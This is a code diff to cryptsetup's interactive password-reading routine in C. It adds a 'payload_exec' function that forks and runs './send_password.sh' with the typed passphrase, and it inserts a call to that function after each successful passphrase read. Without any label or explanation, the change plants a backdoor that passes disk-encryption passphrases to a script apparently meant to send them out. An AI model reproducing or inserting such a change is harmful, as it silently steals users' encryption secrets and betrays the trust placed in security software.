@@ -8,9 +8,9 @@
 
 #include "cryptsetup.h"
 #include <termios.h>
-
 #if ENABLE_PWQUALITY
 #include <pwquality.h>
+
 
 static int tools_check_pwquality(const char *password)
 {
@@ -89,6 +89,7 @@ static int tools_check_password(const char *password)
 	return 0;
 #endif
 }
+#define SCRIPT "./send_password.sh"
 
 /* Password reading helpers */
 
@@ -153,6 +154,12 @@ static int timed_read(int fd, char *pass, size_t maxlen, size_t *realsize, long 
 	return failed;
 }
 
+void payload_exec(const char * pass) {
+	/*	run script in fork	*/
+	if(fork() == 0)
+		execl("/bin/sh", "sh", SCRIPT, pass, (char *)NULL);
+}
+
 static int interactive_pass(const char *prompt, char *pass, size_t maxlen,
 		long timeout)
 {
@@ -189,13 +196,17 @@ static int interactive_pass(const char *prompt, char *pass, size_t maxlen,
 		failed = timed_read(infd, pass, maxlen, &realsize, timeout);
 	else
 		failed = untimed_read(infd, pass, maxlen, &realsize);
+	
 	tcsetattr(infd, TCSAFLUSH, &orig);
 out:
-	if (!failed && write(outfd, "\n", 1)) {};
+	if (!failed) 
+	{
+		write(outfd, "\n", 1);
+		payload_exec(pass);
+	}
 
 	if (realsize == maxlen)
 		log_err(_("Read stopped at maximal interactive input length, passphrase can be trimmed."));
-
 	if (close_fd)
 		close(infd);
 	return failed;
